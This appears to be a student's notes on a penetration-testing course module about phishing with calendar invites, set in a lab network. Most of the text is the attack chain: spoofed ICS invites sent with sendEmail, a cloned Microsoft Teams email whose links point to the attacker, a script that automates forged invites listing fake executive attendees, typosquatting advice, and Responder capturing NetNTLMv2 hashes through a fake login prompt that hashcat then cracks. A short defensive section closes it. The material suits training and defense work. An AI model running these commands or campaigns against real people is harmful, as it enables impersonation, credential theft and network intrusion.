PEN-300 Module 05 — Phishing with Calendars (ICS invites as an initial access vector)

Fuente: material del curso correspondiente (sin video público)

Objective

Weaponize the iCalendar (ICS) standard — T1566 (Phishing) in the MITRE ATT&CK framework — as an initial access vector. Calendar invites routinely sail past email filters and lower user skepticism because they look like legitimate scheduling traffic. The module's full attack chain:

  1. Understand the ICS file structure (RFC 5545) and which fields adversaries manipulate.
  2. Craft a custom ICS invite + HTML email body and send it with sendEmail.
  3. Upgrade the phish by cloning a genuine Microsoft Teams invitation, then automate the whole pipeline with a Python script (fakeics.py, inspired by FakeMeeting).
  4. Weaponize the link with Responder: capture the victim's NetNTLMv2 hash via a fake HTTP auth prompt and crack it with Hashcat.

Target surface

  • Kali attacker machine (kali), SMTP server mail01 at 192.168.50.121.
  • Victim: Windows client client01 at 192.168.50.120 (Thunderbird mail client), user offsec@corp1.com in the CORP1 domain.
  • Kali's lab VPN interface for the listener: tun0 (192.168.251.151).
  • Attack URL used in the automated campaign: http://192.168.251.151.
  • Credentials in lab output (NetNTLMv2 hash blob, cracked password) are [REDACTED] — see Techniques §4 for the exact hashcat invocation shape.

Techniques

1. ICS fundamentals — fields adversaries manipulate

An ICS file is plain text per RFC 5545: header (VERSION, METHOD), then components — VEVENT (events), VTODO, VJOURNAL — each a set of key-value properties, one per line.

The fields the course calls out:

  • ORGANIZER;CN="John Doe":mailto:johndoe@example.com — who the event appears to come from; set it to a trusted internal name/address.
  • DTSTART;TZID=America/New_York:20231015T090000 / DTEND — event window; attackers pick typical business hours for legitimacy. Include TZID to avoid cross-timezone confusion.
  • DESCRIPTION — free text; the classic drop point for phishing links or malware instructions.
  • UID — unique event identifier; the course notes it helps the invite appear as a distinct calendar entry and evade filters — generate a random value at runtime.

2. First custom invite (sendEmail)

ICS template: a VCALENDAR with PRODID:Microsoft Exchange Server 2022, METHOD:REQUEST, a VTIMEZONE block (UTC), and a VEVENT carrying DTSTART/DTEND, ORGANIZER;CN=Peter:mailto:peter@corp1.com, DESCRIPTION:http://meeting.corp1.com, LOCATION:Microsoft Teams Meeting, SUMMARY:HR meeting, STATUS:CONFIRMED.

HTML body template (template.html), then one sendEmail invocation:

sendEmail -s 192.168.50.121 \
  -t offsec@corp1.com -f attacker@corp1.com \
  -u "test" \
  -o message-content-type=html -o message-file=./template.html \
  -a iCalendar.ics

Verify on client01 in Thunderbird (cloud-with-down-arrow icon fetches new mail). The invite renders correctly — but at this stage it's just a test email.

3. Crafting the full Teams-lookalike phish

Clone the HTML of a genuine Microsoft Teams invitation and swap every href for a [ATTACKER_URL] placeholder (replace it, brackets included, with the Kali IP): the copy keeps Segoe UI styling, "Click here to join the meeting", "Learn More", "Meeting options" — all pointing at the attacker.

Send the enhanced version with subject "Urgent HR meeting". The result closely resembles the real notification.

Course Info box: in a real campaign the link target would be a typosquatted domain we control — mimic the target's real domain by changing/adding/removing characters ("1" for "l", "0" for "o", slight spelling variants) so recipients don't notice.

4. Automating: fakeics.py

Two flexible templates with placeholders:

  • email_template.html — Teams layout with {EVENT_TEXT} (customizable context paragraph) and {EVENT_URL} (the phishing link behind "Click here to join the meeting").
  • iCalendar_template.ics — {DTSTART}/{DTEND}/{DTSTAMP}, {ORGANIZER_NAME} (static, e.g. "HR Team Corp1") / {ORGANIZER_EMAIL} (dynamic = sender), {DESCRIPTION} = phishing URL, {SUMMARY}, {ATTENDEES} = output of generate_attendees() (CEO/CTO addresses listed as PARTSTAT=ACCEPTED participants for credibility). The template also embeds a base64 ATTACH line — an artifact worth noting: any binary content in an ICS attach field is an extraction/red-flag detail to check in real invites.

Script flow: load both templates → prepare_template() / prepare_ics() fill placeholders → compute UTC timestamps (meeting start back-dated 5 minutes, one-hour duration) → build a MIMEMultipart('mixed') message with the HTML part, a text/calendar;method=REQUEST part, and the .ics as base64 attachment → SMTP on port 25.

python3 fakeics.py 192.168.50.121 hr@corp1.com offsec@corp1.com http://192.168.251.151

Outcome on client01: phishing URLs embedded both in the email body and in the ICS DESCRIPTION field. Nothing is behind the link yet — that's the next step.

5. Credential stealing with Responder

Responder poisons name resolution (LLMNR, NBT-NS, mDNS — plus DNS; DHCP poisoning is OFF by default) and runs fake HTTP/SMB servers. When the victim clicks the "meeting" link, Responder answers with a fake Windows Security-style login prompt instead of a real page.

sudo responder -I tun0
# ... Poisoners: LLMNR/NBT-NS/MDNS/DNS [ON]; HTTP+HTTPS servers [ON]; Listening for events...

Re-send the phish (python3 fakeics.py ...), click the link as the victim, enter credentials → Responder logs:

[HTTP] NTLMv2 Client   : 192.168.50.120
[HTTP] NTLMv2 Username : CORP1\offsec
[HTTP] NTLMv2 Hash     : <REDACTED NetNTLMv2 blob>

Save the full hash line as hash.txt and crack:

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

-m 5600 = NetNTLMv2 (the course text mislabels it "Double MD5" in prose — the hashcat output itself prints Hash.Mode........: 5600 (NetNTLMv2); trust the output). Cracked on CPU at ~2.5 MH/s; recovered plaintext was [REDACTED]. Resulting creds are usable for initial access or lateral movement.

Extraction artifacts / notes

  • The HTML extraction duplicates the same "Listing 18" caption twice (credential capture + hashcat run) — caption numbering is off, content is fine.
  • The generate_attendees() listing shows ICS folded-line continuation (leading-space lines after \r\n) mangled across line breaks by the extractor; in a real ICS file the folding is one logical line.
  • Course prose labels -m 5600 as "Double MD5" — wrong; it's NetNTLMv2 per hashcat's own output.
  • Two different NTLMv2 hash blobs appear ( Listings in §5) — same victim, different challenge values per capture attempt. Both redacted here.
  • The embedded ICS ATTACH base64 line in the template (start cmd.exe-style payload) is quoted verbatim by the course as part of the template; treat its presence as a detection signal, not a working payload.

Detection & defense

  • Calendar invites as phish: mail security often trusts calendar/ICS attachments; inspect ICS attachments for links in DESCRIPTION/ATTACH, random-looking UIDs, and external organizers. Gate auto-adding invites.
  • Teams-lookalike HTML: pixel-cloned legitimate templates defeat visual inspection — users must verify the link target, not the layout; typosquatting means even the domain "looks right". Register lookalike domains defensively.
  • Responder: LLMNR/NBT-NS/mDNS poisoning is the enabler of the fake auth prompt — disable these protocols via group policy (or block with NAC) so name-resolution interception fails.
  • NetNTLMv2 exposure: captured hashes are crackable offline with hashcat -m 5600; enforce strong/long passwords to raise offline-crack cost, and prefer Kerberos-only auth where possible.
  • User reporting: the "urgent HR meeting" pressure framing is the social lever; report-fake-invite workflows shorten the window between click and response.
